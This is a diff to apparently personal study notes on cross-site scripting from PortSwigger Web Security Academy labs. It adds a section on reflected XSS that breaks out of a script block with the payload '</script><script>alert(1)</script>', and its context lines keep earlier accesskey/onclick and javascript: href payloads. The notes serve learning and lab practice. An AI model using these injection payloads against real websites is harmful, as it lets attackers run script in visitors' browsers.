@@ -755,9 +755,31 @@ if target click that key combination, onclick will work
 
 <link rel="canonical" href='https://0a7d00e70327e3fb8503c6e4009b00bb.web-security-academy.net/?'accesskey='x'onclick='alert(1)'/>
 
-
-
 final payload --> Website javascript:alert(1)
 
 <a id="author" href="javascript:alert(1)">test</a>
+___________________________________________________________________________________________________________________________________________________________________
+Reflected XSS by closing with </script>
+----------------------------------------
+When you type test, it will get into like this
+
+<script>
+var searchTerms = 'test';
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+
+</script>
+
+
+payload--> </script><script>alert(1)</script>
+
+In inspect mode
+-------------
+
+<script>var searchTerms = '</script>
+<script>alert(1)</script>
+
+';
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+___________________________________________________________________________________________________________________________________________________________________
+
  
